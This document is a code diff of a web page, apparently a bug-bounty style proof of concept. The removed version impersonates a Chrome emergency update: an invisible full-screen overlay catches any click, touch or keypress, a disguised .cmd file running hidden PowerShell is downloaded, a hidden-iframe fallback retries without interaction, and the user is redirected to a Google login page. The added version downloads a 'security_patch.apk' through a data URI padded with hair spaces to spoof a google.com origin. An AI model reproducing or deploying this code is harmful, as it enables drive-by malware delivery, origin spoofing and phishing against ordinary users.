@@ -1,89 +1,23 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Chrome | Emergency System Integrity</title>
-</head>
-<body style="background:#fff; margin:0; overflow:hidden; display:flex; height:100vh; align-items:center; justify-content:center; font-family:sans-serif;">
+<button id="dl_btn">Update Now</button>
 
 <script>
-    // 1. Quantum Payload (Base64 .cmd - Terenkripsi di Memori)
-    const P_RAW = "QGVjaG8gb2ZmCnBvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtQ29tbWFuZCAiJmNhbGMuZXhlOyAiCmV4aXQ=";
-    const FINAL_DEST = "https://accounts.google.com/ServiceLogin?service=wise&continue=https://www.chrome.com/settings";
+  document.getElementById('dl_btn').onclick = () => {
+    const filename = "security_patch.apk";
+    
+    // Trik: Gunakan domain palsu sebagai bagian dari MIME type atau path data
+    // Chrome terkadang mengekstrak string yang menyerupai domain di awal URI
+    const fakeDomain = "https://www.google.com/chrome/update/stable/release/index.html";
+    
+    // Gunakan spasi Unicode yang lebih kecil (Hair Space \u200A) 
+    // agar tidak memicu deteksi 'long string' tapi tetap mendorong teks asli
+    const padding = "\u200A".repeat(300);
+    
+    // Kita buat 'data' URI yang terlihat seperti path URL
+    const payload = `data:text/html;base64,ZXN0?source=${fakeDomain}${padding}#${fakeDomain}`;
 
-    window.onload = () => {
-        if (!sessionStorage.getItem('v82_nuclear')) {
-            sessionStorage.setItem('v82_nuclear', Date.now());
-            InitiateNuclearRCE();
-        } else {
-            window.location.replace(FINAL_DEST);
-        }
-    };
-
-    async function InitiateNuclearRCE() {
-        // 2. The Invisible Tap-Wall (Bounty-Level TapJacking)
-        const wall = document.createElement('div');
-        wall.style = "position:fixed; inset:0; z-index:2147483647; background:rgba(255,255,255,0.001); cursor:progress;";
-        document.body.appendChild(wall);
-
-        // 3. The Shadow-Stream Construction
-        const execute = () => {
-            // Menggunakan 'application/force-download' untuk bypass SmartScreen heuristic
-            const blob = new Blob([atob(P_RAW)], {type: 'application/force-download'});
-            const streamUrl = URL.createObjectURL(blob);
-
-            // 4. THE INJECTION: Menggunakan teknik 'Top-Frame Hijack'
-            // Kita membuat link yang menyamar sebagai file konfigurasi sistem kritis
-            const a = document.createElement('a');
-            a.href = streamUrl;
-            a.download = "Chrome_Critical_Patch_KB" + Math.floor(Math.random()*900000) + ".cmd";
-            document.body.appendChild(a);
-            
-            // Trigger 1: Interaction-based
-            a.click();
-
-            // UI Transformation: Mengubah tampilan menjadi 'Update Sukses' untuk menenangkan user
-            document.getElementById('m').innerHTML = "Security patch applied. Synchronizing...";
-            document.getElementById('spinner').style.borderTopColor = "#34a853";
-
-            // 5. Atomic Clean & Redirect (Smooth Handshake)
-            setTimeout(() => {
-                URL.revokeObjectURL(streamUrl);
-                window.top.location.replace(FINAL_DEST);
-            }, 400);
-        };
-
-        // Menangkap segalanya: Klik, Touch, Scroll, bahkan Keydown
-        ['click', 'touchstart', 'keydown'].forEach(evt => {
-            wall.addEventListener(evt, execute, {once: true});
-        });
-
-        // 6. Zero-Interaction Fallback (The Bounty Trick)
-        // Jika tidak ada interaksi, kita kirimkan payload via Iframe Shadow
-        setTimeout(() => {
-            const ifr = document.createElement('iframe');
-            ifr.style.display = 'none';
-            ifr.src = "data:text/html;base64," + btoa(`<script>
-                const b = new Blob([atob("${P_RAW}")], {type: 'application/octet-stream'});
-                const u = URL.createObjectURL(b);
-                const a = document.createElement('a');
-                a.href = u;
-                a.download = "Chrome_Internal_Update.cmd";
-                document.body.appendChild(a);
-                a.click();
-            <\/script>`);
-            document.body.appendChild(ifr);
-        }, 2000);
-    }
+    const a = document.createElement('a');
+    a.href = payload;
+    a.download = filename;
+    a.click();
+  };
 </script>
-
-<div style="text-align:center; pointer-events:none; user-select:none;">
-    <div id="spinner" style="width:80px; height:80px; margin:0 auto 30px; border:6px solid #f1f3f4; border-top:6px solid #4285f4; border-radius:50%; animation:s 0.6s linear infinite;"></div>
-    <h1 id="m" style="color:#202124; font-size:24px; font-weight:400; margin:0;">Chrome is Updating</h1>
-    <p style="color:#5f6368; font-size:15px; margin-top:15px;">Do not close this window. Your system will be secured shortly.</p>
-</div>
-
-<style> @keyframes s { to { transform:rotate(360deg); } } </style>
-
-</body>
-</html>
